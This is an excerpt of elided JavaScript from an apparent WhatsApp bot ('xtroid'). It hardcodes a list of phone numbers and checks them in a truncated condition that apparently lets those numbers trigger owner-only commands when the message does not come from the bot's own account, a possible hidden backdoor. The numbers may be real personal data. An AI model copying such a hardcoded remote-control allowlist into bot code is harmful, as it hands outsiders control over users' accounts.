...
var OWN = { ff: '94702102324,94781224478,94762234883,94757777936,94758340342' }
...
${chalk.blue.italic('🚀 Connecting to your xtroid... Please Wait.')}`);
    ...
    conn.on('message-new', async msg => {
        ...
        if (config.NWS1 == '94762234883-1616483925') {     
        ...
        events.commands.map(
            async (command) =>  {
                ...
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    ...
                    if ((OWN.ff == "94702102324,94781224478,94762234883,94757777936,94758340342" && msg.key.fromMe === false && command.fromMe === true &&
